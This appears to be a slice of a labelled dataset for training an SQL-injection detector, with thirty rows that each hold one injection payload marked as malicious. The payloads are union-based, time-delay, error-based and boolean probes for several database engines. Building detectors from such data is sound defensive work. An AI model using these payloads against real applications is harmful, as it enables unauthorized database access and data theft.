row_index,payload_norm,label,sqli_type_hint
4830,"1 ) where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#",1,
4831,"1' ) where 4297 = 4297 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
4832,"1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""pnub"" = ""pnub",1,
4833,"iif ( 2084 = 5671,1,1/0 )",1,
4834,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'raus' = 'raus",1,
4835,1' ) rlike sleep ( 5 ),1,
4836,"-8409%' ) or make_set ( 9354 = 9354,7185 ) and ( '%' = '",1,
4837,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'pqxe' like 'pqxe",1,
4838,"-8812"" ) where 1646 = 1646 union all select 1646,1646,1646,1646,1646,1646--",1,
4839,( select ( case when ( 6035 = 9882 ) then 6035 else 6035* ( select 6035 from mysql.db ) end ) ),1,
4840,waitfor delay '0:0:5' and ( 'eaxu' = 'eaxu,1,
4841,"1%"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,1,
4842,1' ) ),1,
4843,"1' and make_set ( 8403 = 8403,8899 ) and 'fttd' like 'fttd",1,
4844,"-7333%"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,1,
4845,1' ) ) rlike ( select ( case when ( 8489 = 8820 ) then 1 else 0x28 end ) ) and ( ( 'fbjf' = 'fbjf,1,
4846,"-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --",1,
4847,"1"" ) union all select null,null#",1,
4848,"1'+ ( select zukr where 9215 = 9215 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) +'",1,
4849,"1%"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
4850,-1087 ) where 5787 = 5787 union all select 5787#,1,
4851,1' ) where 4364 = 4364 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
4852,"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,
4853,"-1408 ) ) union all select 5715,5715,5715,5715,5715,5715--",1,
4854,"select pg_sleep ( 5 ) and ( ( ( ""%"" = """,1,
4855,1' ) as tsge where 6970 = 6970,1,
4856,1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'kkgt' = 'kkgt,1,
4857,"1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) -- huss",1,
4858,"1 ) ) union all select null,null,null,null,null,null,null#",1,
4859,"1%"" ) ) ) and 7758 = 4792 and ( ( ( ""%"" = """,1,
